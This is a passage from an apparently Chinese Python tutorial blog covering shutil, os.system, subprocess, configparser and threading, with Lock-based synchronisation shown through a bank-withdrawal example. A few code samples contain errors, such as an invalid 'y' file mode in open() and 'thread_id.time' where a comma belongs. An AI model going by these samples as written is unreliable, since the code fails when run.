#拷贝文件src到dst，如果dst为目录，则拷贝到dst目录下</li><li>shutil.copy2(src,dst)    #拷贝文件src到dst，如果dst为目录，则拷贝到dst目录下</li><li>shutil.copytree(src,dst,symlinks=False,ignore=None)    #拷贝目录树src到dst</li><li>shutil.move(src,dst)    #将文件/目录src移动到dst</li></ul><p><strong>磁盘的基本操作</strong></p><p>使用shutil模块中的disk_usage函数，可以获取磁盘空间的使用情况，语法形式如下：</p><p>shutil.disk_usage(path)    #返回指定path上的磁盘的空间使用情况：（总数，已用，可用）</p><h1 id="三、执行操作系统命令和运行其他程序"><a href="#三、执行操作系统命令和运行其他程序" class="headerlink" title="三、执行操作系统命令和运行其他程序"></a>三、执行操作系统命令和运行其他程序</h1><p><strong>os.system函数</strong></p><p>使用os模块中的system函数，可以在Python程序中执行操作系统的命令和脚本，或运行其它程序，语法形式如下：</p><p>os.system(command)    #执行操作系统命令，返回命令执行结果的返回代码</p><pre class=" language-python"><code class="language-python">os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#执行操作系统命令</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'notepad.exe'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#执行程序，启动记事本</span></code></pre><p><strong>os.popen函数</strong></p><p>执行操作系统的命令和脚本</p><p>os.popen(…)    #执行操作系统命令，返回打开的管道（相当于文件）</p><p><strong>subprocess模块</strong></p><p>创建子进程、运行外部程序、连接到其输入/输出/错误管道、获取其返回值</p><p>取代os.system和os.popen函数，提供更高级的功能</p><ul><li>call(args,*,stdin=None,stdout=None,stderr=None,shell=False,timeout=None)</li><li>check_call(args,*,stdin=None,stdout=None,stderr=None,shell=False,timeout=None)</li><li>check_output(args,’,stdin=None,stderr=None,shell=False,universal_newlines=False,timeout=None)</li></ul><p><strong>获取终端的大小</strong></p><p>通过os或shutil模块的get_terminal_size函数，可以获取终端的大小，以方便输出内容的格式化操作</p><ul><li>os.get_terminal_size(fd=STDOUT_FILENO)    #获取并返回终端大小</li><li>shutil.get_terminal_size(fallback=(80,24))    #获取并返回终端大小</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#获取终端的大小示例</span><span class="token keyword">import</span> os<span class="token punctuation">,</span>shutil<span class="token keyword">def</span> <span class="token function">get_term_size_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sz<span class="token operator">=</span>shutil<span class="token punctuation">.</span>get_terminal_size<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'窗口大小：'</span><span class="token punctuation">,</span>sz<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>sz<span class="token punctuation">.</span>lines<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token operator">*</span> sz<span class="token punctuation">.</span>columns<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    get_term_size_test<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><strong>文件压缩和解压缩</strong></p><p>使用shutil模块的make_archive和unpack_archive等函数，实现文件的压缩和解压缩功能</p><p>shutil模块支持的压缩和解压缩格式：shutil模块的get_archive_formats和get_unpack_formats函数返回支持的压缩和解压缩格式</p><h1 id="四、CONFIGPARSER模块和配置文件"><a href="#四、CONFIGPARSER模块和配置文件" class="headerlink" title="四、CONFIGPARSER模块和配置文件"></a>四、CONFIGPARSER模块和配置文件</h1><ul><li>configparser模块用于读取和写入配置文件</li><li>INI文件及INI文件格式<ul><li>通常位于应用程序的配置文件文件夹中，用于保存应用程序的各种配置信息</li></ul></li><li>ConfigParser对象和INI文件操作<ul><li>读取和写入INI文件……<br><img src="https://www.hualigs.cn/image/604c831cae4d9.jpg" alt=""></li></ul></li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#读取和写入INI文件</span><span class="token keyword">import</span> configparser<span class="token keyword">def</span> <span class="token function">ini_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#创建INI文件</span>    config<span class="token operator">=</span>configparser<span class="token punctuation">.</span>ConfigParser<span class="token punctuation">(</span><span class="token punctuation">)</span>    config<span class="token punctuation">[</span><span class="token string">'SystemInfo'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'port'</span><span class="token punctuation">:</span><span class="token string">'8080'</span><span class="token punctuation">}</span>    config<span class="token punctuation">[</span><span class="token string">'GameInfo'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'level1'</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'scores'</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'example.ini'</span><span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token keyword">as</span> configfile<span class="token punctuation">:</span>        config<span class="token punctuation">.</span>write<span class="token punctuation">(</span>configfile<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ini_read_write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#读取和设置INI文件</span>    config<span class="token operator">=</span>configparser<span class="token punctuation">.</span>ConfigParser<span class="token punctuation">(</span><span class="token punctuation">)</span>    config<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token string">'example.ini'</span><span class="token punctuation">)</span>    config<span class="token punctuation">[</span><span class="token string">'SystemInfo'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'port'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'8088'</span>    config<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token string">'GameInfo'</span><span class="token punctuation">,</span><span class="token string">'scores'</span><span class="token punctuation">,</span><span class="token string">'1000'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> config<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token string">'GameInfo'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'example.ini'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> configfile<span class="token punctuation">:</span>        config<span class="token punctuation">.</span>write<span class="token punctuation">(</span>configfile<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    ini_create<span class="token punctuation">(</span><span class="token punctuation">)</span>    ini_read_write<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>3/13/2021 6:47:58 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python多线程</title>
      <link href="2021/03/12/python-duo-xian-cheng/"/>
      <url>2021/03/12/python-duo-xian-cheng/</url>
      
        <content type="html"><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><p>进程是操作系统中正在执行的不同应用程序的一个实例</p><p>线程是进程中的一个实体，是被操作系统独立调度和分派处理时间的基本单位</p><p><strong>线程的优缺点：</strong></p><ul><li>并发处理，因而特别适合需要同时执行多个操作的场合</li><li>解决用户响应性能和多任务的问题</li><li>引入了资源共享和同步等问题</li></ul><p>python3创建多线程主要有两种方法：函数、类</p><p>python3内置模块threading.Thread，可以很方便的创建多线程，threading.Thread()一般接收2个参数：</p><ul><li>线程函数名：要放置线程让其后台执行的函数，由用户自定义</li><li>线程函数的参数：线程函数名所需的参数，以tuple形式传入，如果不需要参数，可以不制定。</li></ul><p>自定义的类，两个要求：</p><ul><li>必须继承threading.Thread这个父类</li><li>必须重写init()和run()方法。run()方法相当于第一种方法中的线程函数，可以写自己需要的业务逻辑代码，在start()后会自动调用</li></ul><pre class=" language-python"><code class="language-python">threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>group<span class="token operator">=</span>None<span class="token punctuation">,</span>target<span class="token operator">=</span>None<span class="token punctuation">,</span>name<span class="token operator">=</span>None<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>kwars<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><ul><li>group: 应该为None</li><li>target: 可以传入一个函数用于run()方法调用</li><li>name: 线程名默认使用“Thread.N”</li><li>args: 元组，表示传入target函数的参数</li><li>kwargs: 字典，传入target函数中关键字参数</li></ul><p><strong>属性：</strong></p><ul><li>name    #线程表示，没有任何语义</li><li>daemon    #布尔值，如果是守护线程为True，不是为False，主线程不是守护线程，默认False</li></ul><p><strong>类方法：</strong></p><ul><li>run()    #用以表示线程活动的方法</li><li>start()    #启动线程活动</li><li>join([time])    #等待至线程中止。阻塞调用线程直至线程的join()方法被调用中止、正常退出或者抛出未处理的异常，或者是可选的超时发生。在于线程运行完之前，该子线程的父线程将一直被阻塞。</li><li>isAlive():    返回线程是否活动的</li><li>getName():    返回线程名</li><li>setName():    设置线程名</li></ul><p>python的_thread模块提供了基本的线程和互斥锁支持，threading模块则提供了功能更全面的线程控制机制以及信号量机制。</p><h1 id="二、创建和启动多线程"><a href="#二、创建和启动多线程" class="headerlink" title="二、创建和启动多线程"></a>二、创建和启动多线程</h1><ul><li><strong>使用start_new_thread函数创建线程</strong></li></ul><p>thread.start_new_thread(function,’args’,[kwargs])    #创建一个新线程并返回其标识符</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#使用_thread模块的start_new_thread函数创建线程</span><span class="token keyword">import</span> _thread<span class="token punctuation">,</span>time<span class="token punctuation">,</span>random<span class="token keyword">def</span> <span class="token function">timer</span><span class="token punctuation">(</span>interval<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>range<span class="token punctuation">(</span>interval<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#随机睡眠0-interval秒</span>        thread_id<span class="token operator">=</span>_thread<span class="token punctuation">.</span>get_ident<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取当前线程标识符</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Thread:{0} Time{1}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>thread_id<span class="token punctuation">.</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#使用start_new_thread()函数创建2个线程</span>    _thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span>timer<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建线程</span>    _thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span>timer<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建线程</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    test<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li><strong>使用Thread对象创建线程</strong><br>​​​​​​​<br>Thread(target=None,name=None,args=(),kwargs={})    #构造函数</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token punctuation">,</span>time<span class="token punctuation">,</span>random<span class="token keyword">def</span> <span class="token function">timer</span><span class="token punctuation">(</span>interval<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>range<span class="token punctuation">(</span>interval<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#随机睡眠0-interval秒</span>        thread_id<span class="token operator">=</span>threading<span class="token punctuation">.</span>get_ident<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取当前线程标识符</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Thread:{0} Time:{1}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>thread_id<span class="token punctuation">,</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>timer<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    t2<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>timer<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    test<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/604b8bae74073.jpg" alt=""></p><ul><li><strong>自定义派生于Thread的对象</strong></li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#通过声明Thread派生类，创建和启动新线程</span><span class="token keyword">import</span> threading<span class="token punctuation">,</span>time<span class="token punctuation">,</span>random<span class="token keyword">class</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#继承threading.Thread</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>interval<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#构造函数</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用父类构造函数</span>        self<span class="token punctuation">.</span>interval<span class="token operator">=</span>interval    <span class="token comment" spellcheck="true">#对象属性</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>range<span class="token punctuation">(</span>self<span class="token punctuation">.</span>interval<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#随机睡眠0-interval秒</span>            thread_id<span class="token operator">=</span>threading<span class="token punctuation">.</span>get_ident<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取当前线程标识符</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Thread:{0} Time:{1}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>thread_id<span class="token punctuation">,</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    t1<span class="token operator">=</span>MyThread<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    t2<span class="token operator">=</span>MyThread<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li><strong>线程加入join()</strong></li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token punctuation">,</span>time<span class="token punctuation">,</span>random<span class="token keyword">class</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#继承threading.Thread</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#构造函数</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用父类构造函数</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#睡眠1秒</span>            t<span class="token operator">=</span>threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取当前线程</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{0} at {1}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>t<span class="token punctuation">.</span>name<span class="token punctuation">,</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'线程t1结束'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t1<span class="token operator">=</span>MyThread<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建线程   </span>    t1<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">'t1'</span>    <span class="token comment" spellcheck="true">#设置线程名称</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#启动线程</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主线程开始等待线程(t1)2s'</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主线程等待线程(t1)2s结束'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主线程开始等待线程结束'</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主线程结束'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    test<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li><strong>用户线程和daemon线程：</strong><br>​​​​​​​ <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token punctuation">,</span>time<span class="token keyword">class</span> <span class="token class-name">MyThread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#继承threading.Thread</span>  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>interval<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#构造函数</span>      threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用父类构造函数</span>      self<span class="token punctuation">.</span>interval<span class="token operator">=</span>interval    <span class="token comment" spellcheck="true">#对象属性</span>  <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>      t<span class="token operator">=</span>threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取当前线程</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'线程'</span><span class="token operator">+</span>t<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">'开始'</span><span class="token punctuation">)</span>      time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>self<span class="token punctuation">.</span>interval<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#延迟self.interval秒</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'线程'</span><span class="token operator">+</span>t<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">'结束'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">MyThreadDaemon</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>interval<span class="token punctuation">)</span><span class="token punctuation">:</span>      threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>      self<span class="token punctuation">.</span>interval<span class="token operator">=</span>interval  <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>      t<span class="token operator">=</span>threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'线程'</span><span class="token operator">+</span>t<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">'开始'</span><span class="token punctuation">)</span>      <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>          time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>self<span class="token punctuation">.</span>interval<span class="token punctuation">)</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'daemon线程'</span><span class="token operator">+</span>t<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">'正在运行'</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'线程'</span><span class="token operator">+</span>t<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">'结束'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主线程开始'</span><span class="token punctuation">)</span>  t1<span class="token operator">=</span>MyThread<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  t2<span class="token operator">=</span>MyThreadDaemon<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  t1<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">'t1'</span>  t2<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">'t2'</span>  t2<span class="token punctuation">.</span>daemon<span class="token operator">=</span><span class="token boolean">True</span>    <span class="token comment" spellcheck="true">#设置为daemon</span>  t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'主线程结束'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>  test<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><img src="https://www.hualigs.cn/image/604b8bae40e03.jpg" alt=""></li></ul><h1 id="三、线程同步"><a href="#三、线程同步" class="headerlink" title="三、线程同步"></a>三、线程同步</h1><h2 id="1-基于原语锁（Lock-RLock对象）的简单同步"><a href="#1-基于原语锁（Lock-RLock对象）的简单同步" class="headerlink" title="1. 基于原语锁（Lock/RLock对象）的简单同步"></a>1. 基于原语锁（Lock/RLock对象）的简单同步</h2><p><strong>用锁使多线程同时操作同一资源时不产生混乱</strong></p><ul><li>Lock是可用的最低级的同步指令。Lock处于锁定状态时，不被特定的线程拥有。Lock包含两种状态——锁定和非锁定，以及两个基本的方法。</li><li>可以认为Lock有一个锁定池，当线程请求锁定时，将线程至于池中，直到获得锁定后出池。池中的线程处于状态图中的同步阻塞状态。</li><li>RLock（可重入锁）是一个可以被同一个线程请求多次的同步指令。RLock使用了“拥有的线程”和“递归等级”的概念，处于锁定状态时，RLock被某个线程拥有。拥有RLock的线程可以再次调用acquire()，释放锁时需要调用release()相同次数。</li><li>可以认为RLock包含一个锁定池和一个初始值为0的计数器，每次成功调用acquire()/release()，计数器将+1/-1，为0时锁处于未锁定状态。</li><li>简言之：Lock属于全局，RLock属于线程。</li><li>构造方法：Lock(), Rlock()（推荐使用Rlock()）</li><li>实例方法：<ul><li>acquire([timeout]): 尝试获得锁定。使线程进入同步阻塞状态。</li><li>release(): 释放锁。使用前线程必须已获得锁定，否则将抛出异常。</li></ul></li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#题目：使用lock语句同步代码块示例。创建工作线程，模拟银行现金账户取款。多个线程同时执行取款操作时，如果不使用同步处理，会造成账户余额混乱；尝试使用同步锁对象Lock，以保证多个线程同时执行取款操作时，银行现金账户取款的有效和一致。</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token punctuation">,</span>time<span class="token punctuation">,</span>random<span class="token keyword">class</span> <span class="token class-name">Account</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#继承threading.Thread</span>    lock<span class="token operator">=</span>threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建锁</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#构造函数</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用父类构造函数</span>        Account<span class="token punctuation">.</span>amount<span class="token operator">=</span>amount    <span class="token comment" spellcheck="true">#账户金额</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>withdraw<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#取款</span>    <span class="token keyword">def</span> <span class="token function">withdraw</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        Account<span class="token punctuation">.</span>lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#获取锁，注释不使用同步处理</span>        t<span class="token operator">=</span>threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span>        a<span class="token operator">=</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> Account<span class="token punctuation">.</span>amount<span class="token operator">&lt;</span>a<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'{0}交易失败，取款前余额：{1}，取款额：{2}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>t<span class="token punctuation">.</span>name<span class="token punctuation">,</span>Account<span class="token punctuation">.</span>amount<span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>            Account<span class="token punctuation">.</span>lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span 